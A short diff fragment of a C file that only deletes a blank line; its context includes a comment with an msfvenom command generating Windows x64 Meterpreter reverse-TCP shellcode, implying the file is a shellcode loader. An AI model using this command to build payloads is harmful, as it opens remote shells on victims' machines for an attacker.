@@ -60,5 +60,4 @@ int main() {
     return 0;
 }
 
-
 //generate shellcode with msfvenom:  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YourIP> LPORT=<Port> -f c
